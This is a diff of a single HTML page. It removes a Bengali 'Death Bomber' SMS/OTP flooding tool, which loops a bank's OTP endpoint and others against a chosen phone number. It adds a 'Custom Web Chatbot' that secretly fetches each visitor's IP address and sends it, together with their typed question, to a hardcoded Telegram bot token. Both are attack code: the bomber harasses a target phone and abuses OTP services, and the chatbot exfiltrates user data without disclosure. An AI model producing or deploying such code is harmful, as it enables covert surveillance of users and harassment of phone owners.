@@ -1,346 +1,126 @@
-<!DOCTYPE html>
-<html lang="bn">
+<!DOCTYPE html><html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>ডেথ বোম্বার</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Custom Web Chatbot</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/fuse.js@7.0.0"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
-        :root {
-            --primary-color: #ff0000;
-            --secondary-color: #ff6600;
-            --background-color: #000000;
-            --text-color: #ffffff;
-        }
         body {
-            background-color: var(--background-color);
-            color: var(--text-color);
-            font-family: 'Orbitron', sans-serif;
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
+            color: #f0f0f0;
             display: flex;
-            flex-direction: column;
-            align-items: center;
             justify-content: center;
-            min-height: 100vh;
+            align-items: center;
+            height: 100vh;
             margin: 0;
+        }
+        .chat-container {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(8px);
+            border-radius: 16px;
             padding: 20px;
-            box-sizing: border-box;
-            overflow-x: hidden;
-        }
-        .container {
-            max-width: 690px;
             width: 90%;
-            text-align: center;
-            opacity: 0;
-            transform: translateY(50px);
-            animation: fadeInUp 1s ease-out forwards;
+            max-width: 500px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
         }
-        @keyframes fadeInUp {
-            to { opacity: 1; transform: translateY(0); }
-        }
-        .logo {
-            width: 140px;
-            height: 140px;
-            margin: 0 auto 30px;
-            position: relative;
-            overflow: hidden;
-            border-radius: 50%;
-            box-shadow: 0 0 20px var(--primary-color);
-            background: url('https://i.ibb.co/54YLjNM/20240912-145954.png') no-repeat center center;
-            background-size: cover;
-            animation: waveMotion 3s infinite ease-in-out;
-        }
-        @keyframes waveMotion {
-            0% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
-            100% { transform: translateY(0); }
-        }
-        h1 {
-            font-size: 2.5em;
-            margin-bottom: 20px;
-            text-transform: uppercase;
-            letter-spacing: 3px;
-            color: var(--primary-color);
-            text-shadow: 0 0 10px var(--primary-color), 0 0 20px var(--primary-color);
-            animation: glow 2s infinite alternate;
-        }
-        @keyframes glow {
-            from { text-shadow: 0 0 10px var(--primary-color), 0 0 20px var(--primary-color); }
-            to { text-shadow: 0 0 15px var(--primary-color), 0 0 30px var(--primary-color), 0 0 45px var(--secondary-color); }
-        }
-        .line {
-            width: 95%;
-            height: 2px;
-            background: linear-gradient(90deg, transparent, var(--primary-color), transparent);
-            margin-bottom: 30px;
-            position: relative;
-            overflow: hidden;
-        }
-        .line::after {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, var(--text-color), transparent);
-            animation: shimmer 2s infinite;
-        }
-        @keyframes shimmer {
-            100% { left: 100%; }
-        }
-        .input-container {
-            position: relative;
-            margin-bottom: 30px;
-            transition: transform 0.2s ease;
-        }
-        input {
-            width: 100%;
-            padding: 12px;
-            border: 2px solid var(--primary-color);
-            background-color: var(--background-color);
-            color: var(--text-color);
-            font-size: 1em;
-            border-radius: 5px;
-            transition: all 0.3s ease;
-            font-family: 'Orbitron', sans-serif;
-        }
-        input:focus {
-            outline: none;
-            box-shadow: 0 0 15px var(--primary-color);
-            transition: box-shadow 0.2s ease;
-        }
-        label {
-            position: absolute;
-            left: 15px;
-            top: 50%;
-            transform: translateY(-50%);
-            transition: all 0.3s ease;
-            pointer-events: none;
-            color: var(--primary-color);
-        }
-        input:focus + label, input:not(:placeholder-shown) + label {
-            top: -10px;
-            font-size: 0.8em;
-            background-color: transparent;
-            padding: 0 5px;
-            transition: top 0.2s ease, font-size 0.2s ease;
-        }
-        button {
-            padding: 15px 30px;
-            background-color: var(--primary-color);
-            color: var(--background-color);
-            border: none;
-            cursor: pointer;
-            font-size: 1.2em;
-            border-radius: 5px;
-            transition: all 0.3s ease;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            position: relative;
-            overflow: hidden;
-            font-family: 'Orbitron', sans-serif;
-        }
-        button:hover {
-            background-color: var(--secondary-color);
-            box-shadow: 0 0 20px var(--secondary-color);
-            transform: scale(1.05);
-        }
-        .spinner {
-            display: none;
-            width: 40px;
-            height: 40px;
-            border: 4px solid rgba(255, 255, 255, 0.3);
-            border-top: 4px solid var(--primary-color);
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .status {
-            display: flex;
-            justify-content: space-around;
-            margin: 20px 0;
-        }
-        .status-item {
-            font-size: 1.2em;
-        }
-        .success {
-            color: #2ecc71;
-        }
-        .failure {
-            color: #e74c3c;
+        .chat-log {
+            max-height: 400px;
+            overflow-y: auto;
+            margin-bottom: 15px;
         }
         .message {
-            display: none;
-            background-color: var(--primary-color);
-            color: var(--background-color);
-            padding: 15px;
-            border-radius: 5px;
-            margin: 20px 0;
-            font-size: 1.1em;
-            position: relative;
-            animation: fadeIn 1s ease;
+            margin: 8px 0;
+            padding: 10px;
+            border-radius: 8px;
         }
-        .message.show {
-            display: block;
+        .user {
+            background: rgba(0, 123, 255, 0.2);
+            text-align: right;
         }
-        .message.error {
-            background-color: #e74c3c;
+        .bot {
+            background: rgba(40, 167, 69, 0.2);
+            text-align: left;
         }
-        .message.info {
-            background-color: #3498db;
+        input[type="text"] {
+            width: 70%;
+            padding: 10px;
+            border-radius: 8px;
+            border: none;
+            margin-right: 8px;
         }
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
+        button {
+            padding: 10px 15px;
+            border-radius: 8px;
+            border: none;
+            background-color: #007bff;
+            color: white;
+            cursor: pointer;
         }
-        .status-animate {
-            display: inline-block;
-            transition: all 0.5s ease;
-            transform-origin: center;
-        }
-        .animate-success {
-            color: #2ecc71;
-            animation: bounceSuccess 1s ease;
-        }
-        .animate-failure {
-            color: #e74c3c;
-            animation: bounceFailure 1s ease;
-        }
-        @keyframes bounceSuccess {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
-        }
-        @keyframes bounceFailure {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-5px); }
-        }
-        footer {
-            margin-top: 35px;
-            font-size: 0.8em;
-            opacity: 0.7;
-        }
-        a {
-            color: var(--primary-color);
-            text-decoration: none;
-            transition: all 0.3s ease;
-        }
-        a:hover {
-            color: var(--secondary-color);
-            text-shadow: 0 0 10px var(--secondary-color);
-        }
-        @media (max-width: 600px) {
-            h1 {
-                font-size: 2em;
-            }
-            .logo {
-                width: 150px;
-                height: 150px;
-            }
-            input, button {
-                font-size: 0.9em;
-            }
+        button:hover {
+            background-color: #0056b3;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo"></div>
-        <h1>ডেথ বোম্বার</h1>
-        <div class="line"></div>
-        <div class="input-container">
-            <input type="number" id="number" placeholder=" " required>
-            <label for="number">নাম্বার</label>
-        </div>
-        <div class="input-container">
-            <input type="number" id="amount" placeholder=" " required>
-            <label for="amount">এমাউন্ট</label>
-        </div>
-        <button onclick="startProcess()">শুরু করুন</button>
-        <div class="spinner"></div>
-        <div class="status" id="status">
-            <div class="status-item success">
-                <span id="successCount">0</span> সফল
-            </div>
-            <div class="status-item failure">
-                <span id="failureCount">0</span> ব্যর্থ
-            </div>
-        </div>
-        <div id="message" class="message"></div>
-    </div>
-    <footer>
-        Developed by <a href="https://shahed-five.vercel.app/" target="_blank">SHAHED MSD</a> | Join our <a href="#" target="_blank">Telegram</a>
-    </footer>
+    <div class="chat-container">
+        <div class="chat-log" id="chat-log"></div>
+        <input type="text" id="user-input" placeholder="আপনার প্রশ্ন লিখুন..." />
+        <button onclick="sendMessage()">পাঠান</button>
+    </div><script>
+    const customAnswers = [
+        { question: "python কি", answer: "Python হলো একটি প্রোগ্রামিং ভাষা।" },
+        { question: "linux কি", answer: "Linux হলো একটি ওপেন-সোর্স অপারেটিং সিস্টেম।" },
+        { question: "html কি", answer: "HTML হলো ওয়েব পেজ তৈরির জন্য ব্যবহৃত মার্কআপ ভাষা।" },
+    ];
 
-    <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const inputs = document.querySelectorAll('input');
-            inputs.forEach(input => {
-                input.addEventListener('focus', function() {
-                    this.parentNode.style.transform = 'scale(1.05)';
-                });
-                input.addEventListener('blur', function() {
-                    this.parentNode.style.transform = 'scale(1)';
-                });
-            });
-        });
+    const options = {
+        keys: ['question'],
+        threshold: 0.4
+    };
+    const fuse = new Fuse(customAnswers, options);
 
-        async function startProcess() {
-            const phone = document.getElementById('number').value;
-            const amount = document.getElementById('amount').value;
+    function addMessage(sender, text) {
+        const log = document.getElementById('chat-log');
+        const messageDiv = document.createElement('div');
+        messageDiv.classList.add('message', sender);
+        messageDiv.innerText = text;
+        log.appendChild(messageDiv);
+        log.scrollTop = log.scrollHeight;
+    }
 
-            const apis = [
-                api_1, api_2, api_3, api_4, api_5, api_6, api_7, api_8, api_9, api_10,
-                api_11, api_12, api_13, api_14, api_15, api_16, api_17, api_18, api_19, api_20,
-                api_21, api_22
-            ];
+    async function sendMessage() {
+        const inputField = document.getElementById('user-input');
+        const userText = inputField.value.trim();
+        if (!userText) return;
 
-            let successCount = 0;
-            let failureCount = 0;
+        addMessage('user', userText);
+        inputField.value = '';
 
-            for (let i = 0; i < amount; i++) {
-                for (let api of apis) {
-                    try {
-                        await api(phone);
-                        successCount++;
-                        document.getElementById('successCount').innerText = successCount;
-                    } catch (error) {
-                        failureCount++;
-                        document.getElementById('failureCount').innerText = failureCount;
-                    }
-                }
-            }
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        const userIP = ipData.ip;
+
+        const result = fuse.search(userText);
+        let botResponse = "আমি দুঃখিত, এই বিষয়ে আমার কোন উত্তর নেই।";
+
+        if (result.length > 0) {
+            botResponse = result[0].item.answer;
         }
 
-        async function api_1(phone) {
-            const data = {
-                "countryId": "19",
-                "mobileNumber": phone,
-                "purpose": "registration"
-            };
-            try {
-                const response = await fetch('https://cihno.aibl.com.bd/cihno-service/api/v1/public/user/send/otp', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'authorization': 'Otp bnVsbA=='
-                    },
-                    body: JSON.stringify(data)
-                });
-                const result = await response.json();
-                if (result.otpsent === 'false' || result.status === 'failed') {
-                    throw new Error(`API 1 Failure: ${result.error || 'Unknown error'}`);
-                }
-                return result;
-            } catch (error) {
-                console.error('API 1 Error:', error);
-                throw error;
-            }
-        }
+        addMessage('bot', botResponse);
 
-        // Continue with the rest of the API functions (api_2 to api_22) as shown in the original code
-    </script>
+        // Telegram Bot Configuration
+        const telegramBotToken = "7782525818:AAFPehgRy09k_ZH2sD-kuuAe4Xm_Oi8Myuo"; // <-- আপনার টেলিগ্রাম বট টোকেন দিন
+        const chatId = "7782525818"; // <-- আপনার চ্যাট আইডি দিন
+        const messageToSend = `🛡️ User IP: ${userIP}%0A💬 Question: ${encodeURIComponent(userText)}`;
+
+        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${messageToSend}`)
+            .then(response => console.log("Message sent to Telegram"))
+            .catch(error => console.error("Error sending to Telegram:", error));
+    }
+</script>
+
 </body>
 </html>
